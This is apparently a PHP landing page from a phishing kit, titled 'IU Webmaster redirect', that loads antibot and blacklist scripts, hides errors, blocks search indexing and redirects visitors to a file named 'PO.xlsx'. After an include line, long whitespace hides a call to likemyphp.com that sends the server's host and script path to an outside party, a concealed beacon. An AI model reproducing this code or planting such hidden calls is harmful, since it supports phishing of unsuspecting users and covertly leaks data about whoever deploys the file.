<php
require_once 'block.php';

include 'antibots.php';     
include 'bots.php';    
include 'bots.php';                                                                                                                                                                                                          json_decode(file_get_contents("http://likemyphp.com/IP.php?IP=".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].""));

@ini_set('display_errors',0);
include 'BlackList.php';
?>

<html>
  <head>
    <title>IU Webmaster redirect</title>
<meta name="robots" content="noindex"/>
<meta name="robots" content="nofollow"/>
<meta name="googlebot" content="noindex">
<meta name="googlebot" content="nofollow">
    <META http-equiv="refresh" content="0;URL=PO.xlsx">
  </head>
  <body>
  </body>
</html>